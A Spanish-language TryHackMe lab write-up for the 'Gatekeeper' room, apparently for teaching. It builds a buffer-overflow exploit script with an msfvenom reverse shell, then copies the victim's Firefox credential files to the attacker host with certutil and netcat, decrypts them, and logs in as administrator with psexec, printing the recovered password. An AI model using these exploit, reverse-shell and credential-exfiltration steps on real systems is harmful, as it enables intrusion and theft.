# Introducción

En nuestra máquina Kali, instala openvpn: ```sudo apt install openvpn``` y su archivo de configuración de vuestro perfil de Tryhackme.

Nos conectamos mediante el siguiente comando: ```sudo openvpn tu_archivo.ovpn```

Ve al laboratorio en cuestión: https://tryhackme.com/room/gatekeeper y empieza la máquina.

![78a8f36c1dfb9abfbd0ea95082f82e26](https://user-images.githubusercontent.com/107146199/172962055-32a9ff9e-2528-4721-8b81-013d03a336d3.png)

Cuando tengas la IP estaremos listos.

## Preparativos

Ejecutamos un nmap de la siguiente manera: ```nmap -sC -sV -T5 -vv 10.10.250.223```

```-sC y -sV```: usados conjuntamente nos brinda la oportunidad de ver los scripts genéricos y sus respectivas versiones.

```-T5```: aumentamos la velocidad de procesos (threads), siendo 1 la forma más silenciosa y 5 la forma más ruidosa.

```-vv```: básicamente nos muestra más detalladamente lo obtenido, filtrando más información.

El nmap en cuestión nos muestra lo siguiente:

![e880a4ef64ebf0e08c6656dc61a17bd5](https://user-images.githubusercontent.com/107146199/172963242-3c289a4f-b537-4ee5-9e50-2df147315774.png)

Vemos que los puertos 139 y 445 están abiertos y sabemos que pertenecen a un servidor samba(protocolo para compartir archivos en red de windows).

Usemos el siguiente comando para ver si nos esconde algo el dicho servidor: ```smbclient -L //ip_máquina```

![517691e16395fedee413927be0d8efaa](https://user-images.githubusercontent.com/107146199/172963685-1c0faeac-db62-4261-baf4-964658853ee6.png)

Listando vemos lo siguiente, indaguemos en el directorio ```Users``` de la siguiente manera: ```smbclient //ip_máquina/Users```

![b23e96e662bba04896995c785eba342e](https://user-images.githubusercontent.com/107146199/172963834-7317cea9-3e9c-464b-a6ef-b0224a470d04.png)

El directorio ```Share``` resulta interesante, entremos en ella y veamos que tenemos.

![5c651412f9761d7f415d7fcab01ba848](https://user-images.githubusercontent.com/107146199/172964005-460e517d-0509-43cc-8619-fe1eca44ec72.png)

¡Bingo! Tenemos un posible programa vulnerable, descarguémoslo. De momento tenemos todo lo que necesitamos, vayamos al siguiente paso.

# Haciendo uso de x32dbg

Vámonos a nuestra máquina virtual de Windows, y descarga el siguiente programa: https://github.com/therealdreg/x64dbg-exploiting

Transfiere el archivo de nuestra máquina Kali a nuestra máquina Windows y empecemos. Abre x32dbg y el gatekeeper.exe desde el mismo. Una vez abierto, haz clic varias veces hasta que el programa esté en total ejecución.

![08531916ff9c374b071a9296ae1b2aa5](https://user-images.githubusercontent.com/107146199/172964817-73b5c257-9849-40d9-9395-cdd16d232e05.png)

Debe quedar tal que así. ¡Estamos listos para explotar el programa!

## Explotando gatekeeper.exe

Antes de empezar, siempre que hagamos un reinicio a nuestro Windows debemos introducir la siguiente línea de comandos en nuestro x32dbg:

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```

Así evitamos problemas previos a nuestro trabajo.

Empecemos creando nuestro script en python, abre el clásico bloc de notas de Windows o NotePad ++ y pega la siguiente plantilla:

```
import socket

ip = "127.0.0.1"
port = 31337

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Investigando un poco vemos que uno de los puertos que encontramos anteriormente (el 31337) en nuestro nmap está ejecutando ```gatekeeper.exe```.

Vamos a ir explotando a través de conexiones en nuestra red local (127.0.0.1), más adelante explotaremos la máquina en cuestión pero de momento empezaremos por aquí.

Primero de todo, creamos un patrón cíclico, de 2000. En nuestro x32dbg ve a la pestaña ```logs``` y ejecuta lo siguiente: ```mona.mona("pattern_create 2000")```

![51ab4c3a4f295f20c37212f1f8b22bd5](https://user-images.githubusercontent.com/107146199/172966719-d19f1b9c-bf15-4822-94a7-65db633e0f77.png)

Copiamos el patrón en nuestro script en la línea de ```payload``` tal que así:

![b8f1a0575f80fa5fa2eb9f0ed4d36611](https://user-images.githubusercontent.com/107146199/172966823-5b4f3b08-9922-4c3f-852f-834087db7c2e.png)

¡Ojo! Ten cuidado y revisa que nuestro patrón esté entre comillas. Guarda nuestro script como ```gatekeeper.py``` y en una ```cmd``` ejecútalo con python3: ```python3 gatekeeper.py```. Revisa nuestro x32dbg, si este aún no ha recibido la información de nuestro script prueba varias veces hasta que llegue.

![afff93bd6f9824e4cc040072f49745ff](https://user-images.githubusercontent.com/107146199/172967227-fcdf8b28-3e8e-48a7-91b5-860a0add30c1.png)

Una vez aparezca nuestro patrón, revisamos EIP(puntero de instrucciones extendido, en definitiva le dice al programa dónde ir para ejecutar el siguiente comando), apuntamos el valor de EIP: ```39654138```

Hacemos una búsqueda del mismo con el siguiente comando: ```mona.mona("pattern_offset 39654138")```

![34e841c2a7b3e750dd8577106aaa6563](https://user-images.githubusercontent.com/107146199/172967886-59d4ca4d-1671-461c-8a27-08c79c98ff30.png)

¡Listo! Necesitamos 146 bytes para llegar al inicio de EIP(en nuestro caso usaremos A para rellenar), aparte de esto rellenaremos dicho EIP(retorno) con 4 bytes(en nuestro caso usaremos B para distinguir mejor y comprobar con exactitud que estamos en el punto previo al stack del programa ```(ESP)```.

En nuestro script introducimos en ```offset``` la cantidad de As y en ```retn``` las 4 Bs. El resultado es tal que así.

![39f7a822801d529a5de2a5854ded9abb](https://user-images.githubusercontent.com/107146199/172968719-424a5a32-2bd0-4ef8-92b3-6728b3ae6577.png)

Guardamos y ejecutamos nuestro script.

¡NOTA!: Siempre que ejecutemos algo que produzca cambios en nuestro x32dbg debemos hacer un reinicio del mismo de la siguiente manera. Siempre que vayamos a ejecutar algo nuevo.

![b5a23f246f1c910dd5407279d59c6933](https://user-images.githubusercontent.com/107146199/172968907-00e92cec-48c3-40d9-9974-5fb3e66eb9f9.png)

Una vez ejecutado nuestro script, veremos lo siguiente:

![b6d53eaae4abc2d80021be9c8df634b0](https://user-images.githubusercontent.com/107146199/172969081-527c53d9-be47-4447-9014-7249013eb035.png)

Estamos en lo cierto, EIP tiene las 4 Bs("\x42" en hexadecimal). Por ahora hemos terminado esta parte inicial, ahora nos dispondremos a buscar badchars(carácteres inválidos que nos impedirán tener ciertos saltos a la pila ```(ESP)``` o que nos anularán bytes de una shellcode).

## Localizando badchars

x32dbg dispone de comandos automatizados que nos proporcionan patrones de estos carácteres. Usando esto, empezaremos excluyendo el byte ```"\x00"```(conocido como NULL-byte)

Reinicia x32dbg y arranca gatekeeper.exe de nuevo. En la pestaña ```logs``` introduce el siguiente comando: ```mona.mona('bytearray -cpb "\\x00"')```

![0f1cbfa8a6bf880774fc50b1fa1b797e](https://user-images.githubusercontent.com/107146199/172969937-bf5e1c34-1c2e-457f-9319-9e89791e72ea.png)

Copia dicho patrón(que excluye \x00) en la línea ```payload``` de la siguiente manera:

![e42e25aee8b1d35a78105c3d7af0ccab](https://user-images.githubusercontent.com/107146199/172970232-fd73e4ce-44d9-4d22-8958-a2662730bc75.png)

Guarda y ejecuta nuestro script, una vez lo recibe x32dbg ejecutamos el siguiente comando: ```mona.mona('compare -f C:\\logs\\gatekeeper\\bytearray.bin -a ESP')```

![f6f8763a775d1084f21fc7ac3f9bf752](https://user-images.githubusercontent.com/107146199/172970468-075cf6b0-d151-4a95-bc5d-0edcf4cd68f7.png)

Tenemos que "\x0a" tambiés es un badchar. Lo añadimos al penúltimo comando y repetimos el proceso: ```mona.mona('bytearray -cpb "\\x00\\x0a"')```

Comprobamos el inicio de ESP y vemos hasta donde llega: en el apartado de direcciones en hexadecimal hacemos clic derecho - ```Go to``` - ```Expression``` y escribimos ```ESP``` una vez ahi deberíamos ver lo siguiente.

![b929ee626b5da36d82b6fbf8de201268](https://user-images.githubusercontent.com/107146199/172971048-ae7f7ee5-c775-46f7-938b-c67a5ed452ea.png)

A priori, el stack está limpio de badchars y entran todos los demás carácteres hexadecimales válidos, pero antes comprobaremos haciendo una última comparación.

![a62d18fd70ea3f2273d1a727ebba39a2](https://user-images.githubusercontent.com/107146199/172971317-8ba04688-2893-41d0-9842-6953d8f0ec08.png)

Estábamos en lo cierto, son los badchars que necesitan excluirse. Ahora nos disponemos a encontrar un salto a la pila ```JMP ESP```.

## Buscando JMP ESP

Reiniciamos nuestro x32dbg y en la pestaña ```logs``` pegamos el siguiente comando: ```mona.mona("jmp -r esp")```

![7bff62cbec1840f85d74db4e29de1a5c](https://user-images.githubusercontent.com/107146199/172971620-08f44ee1-5627-4e2a-a6b3-c09d967d0305.png)

Nos proporciona dos ```JMP ESP```. Veamos si son válidos buscando si incluyen alguno de los badchars anteriores. Definitivamente son válidos ambos así que elige el que te plazca, yo eligo el siguiente: ```0x080414c3```

Comentemos nuestro ```JMP ESP``` en nuestro script para tenerlo más a mano y lo introducimos en el retorno ```retn```(nuestras Bs ya no son necesarias).

¡NOTA! Introduciremos la dirección byte a byte pero de derecha a izquierda.

Finalmente debe ser así:

![4ac69dd23ac453c5bf27f9b9661bbc67](https://user-images.githubusercontent.com/107146199/172972279-5eed2fd0-652d-46f0-8487-8f86f7fc5887.png)

Nuestro exploit ya es válido y lo único que necesitamos ahora es conseguir una reverse shell válida que nos conecte con la IP destino. ¡Prosigamos!

# Reverse Shell

Copiemos nuestro script en nuestra máquina Kali.

Usemos ```msfvenom```. Abre una terminal y ejecuta el siguiente comando:

```msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.214 LPORT=4444 -b "\x00\x0A" -f c -e x86/shikata_ga_nai```

![0332c6805c3cf40ce6fcbfbf9b1cc94b](https://user-images.githubusercontent.com/107146199/172973889-22b9e80e-e292-4665-bf8d-fceba039f54d.png)

Copiamos el resultado del payload creado y lo pegamos en nuestro script de la siguiente manera:

![2b7de9befd8a48a5ae81d655ed71f82e](https://user-images.githubusercontent.com/107146199/172974135-c5da872a-1f35-46d3-86d0-74bead7b7966.png)

Hemos añadido "nops" a la estructura de nuestro script ```\x90```. A veces los programas reservan espacios del stack para almacenar ciertas cosas, información, etcétera. Así evitamos romper nuestra shellcode de ```msfvenom``` al inicio, saltamos varios bytes(en este caso 32 bytes) y la ejecutamos más adelante asegurádonos que llegue completa.

Ahora que estamos atacando la IP de la máquina, copia y pega en ```ip``` dicha IP. Guardamos nuestro script.

Nos ponemos a la escucha con ```ncat``` en el puerto 4444(cómo el que indicamos en nuestra reverse) en otra pestaña de la terminal. Ejecutamos nuestro ```gatekeeper.py``` y deja que suceda la magia.

![192a3483570317debd887cccb108a2ae](https://user-images.githubusercontent.com/107146199/172974731-37cb5a63-46cd-4b1b-929a-51bd272b7cef.png)

Estamos dentro de nuestra víctima, es hora de escalar privilegios.

# Escalada de privilegios

Una vez dentro investigamos que tenemos en el directorio en el que nos encontramos, hacemos ```dir``` y encontramos nuestra flag de ```user```.

![4ba24863f77ae7c91b4fd8933e7bff3c](https://user-images.githubusercontent.com/107146199/172975042-403c3424-962f-4285-904e-2729cd3ca2e2.png)

Ahora nos queda escalar a ```root```.

Vemos que en el directorio en el que nos encontramos hay un archivo de enlace al navegador Firefox, veamos si dicho navegador tiene credenciales de usuarios del equipo guardadas.

Vamos al siguiente directorio: ```C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release```

Listando dicho directorio encontramos los siguientes archivos: ```logins.json``` y ```key4.db```. Estos archios contienen inicios de sesión y bases de datos. Vamos a descargarlos en nuestra máquina Kali.

Primero de todo, descarga netcat con el siguiente comando en tu terminal de Kali: ```wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip```. Aparte de esto, descarga también el desencriptador que usaremos para obtener nuestras credenciales del siguiente repositorio de GitHub: ```https://github.com/lclevy/firepwd.git```

En tu máquina Kali crea un servidor de Python3 en la carpeta ya extraida del netcat con el siguiente comando: ```python3 -m http.server```.

![e25b2a3095e7ae3519181bb8166a84bb](https://user-images.githubusercontent.com/107146199/172976257-cab89c37-62a1-4988-98de-2f5b3ef10f1d.png)

Ve al terminal de la máquina víctima y ejecuta lo siguiente: ```certutil -urlcache -f "http://tun0:8000/nc.exe" nc.exe```. Tendremos netcat en nuestra víctima, lista para enviarnos los archivos mencionados anteriormente.

Ponte en la escucha en tu máquina Kali indicando el archivo que quieres recibir: ```nc -nlvp 1234 > logins.json```. En la víctima ejecuta lo siguiente ```nc.exe -nv tun0 1234 < logins.json``` y espera a recibir el archivo.

Haz lo mismo con ```key4.db```.

Mueve estos dos archivos al directorio de ```firepwd``` e instala los requerimientos de dicho directorio: ```pip install -r requirements.txt```

Lanzamos ahora sí nuestro ```firepwd.py``` (previamente le haremos ```chmod +x firepwd.py``` para darle permisos de ejecución). Finalmente nos muestra la siguientes credenciales.

![0711beecce305d1a4888fb46b899b0f4](https://user-images.githubusercontent.com/107146199/172977157-30783be2-abe2-4920-839b-66c80a5b3a1e.png)

Usamos el siguiente comando con las credenciales obtenidas: ```python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@ip_máquina cmd.exe```

![ea2dd3869bc01aafaf4a9d8449c61ea6](https://user-images.githubusercontent.com/107146199/172977341-1f655767-fcb9-4d07-a09f-b3904c68a65c.png)

Lo hemos conseguido, somos administrador del sistema. Vamos a ```C:\Users\mayor\Desktop``` y aquí tendremos nuestra flag de ```root```.

![7f23d941eb754f4fee8b67c21e97cf08](https://user-images.githubusercontent.com/107146199/172977525-12567a16-0c8f-4b32-b19f-7b04e6b3c72e.png)

# Créditos

https://github.com/therealdreg

https://github.com/x64dbg














